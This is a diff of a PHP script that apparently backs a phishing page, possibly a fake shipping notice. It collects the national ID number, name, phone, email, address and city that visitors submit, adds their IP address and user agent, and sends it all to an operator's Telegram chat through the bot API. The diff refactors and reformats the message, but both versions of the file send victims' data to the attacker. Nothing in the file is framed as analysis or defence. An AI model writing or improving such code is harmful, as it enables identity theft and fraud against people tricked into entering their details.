@@ -1,37 +1,46 @@
 <?php
 include '../telegram.php';
+
 function getUserIP()
 {
-    // Get real visitor IP behind CloudFlare network
+    // Obtener IP real detrás de CloudFlare
     if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
-              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
-              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
+        $_SERVER['REMOTE_ADDR']    = $_SERVER["HTTP_CF_CONNECTING_IP"];
+        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
     }
     $client  = @$_SERVER['HTTP_CLIENT_IP'];
     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
     $remote  = $_SERVER['REMOTE_ADDR'];
 
-    if(filter_var($client, FILTER_VALIDATE_IP))
-    {
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
         $ip = $client;
-    }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP))
-    {
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
         $ip = $forward;
-    }
-    else
-    {
+    } else {
         $ip = $remote;
     }
 
     return $ip;
 }
 
+$user_ip    = getUserIP();
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-$user_ip = getUserIP();
+// Construir mensaje
+$msg  = "🚨 *NUEVA INFORMACIÓN RECIBIDA* 🚨\n\n";
+$msg .= "🆔 *Cédula:* " . $_POST['cedula'] . "\n";
+$msg .= "👤 *Nombre:* " . $_POST['nombre'] . "\n";
+$msg .= "📱 *Teléfono:* " . $_POST['phone'] . "\n";
+$msg .= "📧 *Email:* " . $_POST['email'] . "\n";
+$msg .= "🏠 *Dirección:* " . $_POST['address'] . "\n";
+$msg .= "🏙 *Ciudad:* " . $_POST['city'] . "\n";
+$msg .= "🌍 *IP:* " . $user_ip . "\n";
+$msg .= "🖥 *User-Agent:* " . $user_agent . "\n";
 
-$msg = "GUIA ENTRANTE ✅🎉: ". $_POST['cedula'] . "\nnombre: ". $_POST['nombre'] . "\nphone: ". $_POST['phone'] . "\nemail: ". $_POST['email'] . "\naddress: ". $_POST['address'] . "\nip: ". $user_ip . "\ncity: ". $_POST['city'] . "\n";
-file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
+// Enviar mensaje a Telegram
+file_get_contents(
+    "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$telegram_admin_id."&parse_mode=Markdown&text=" . urlencode($msg)
+);
 ?>
 
 <html><!--
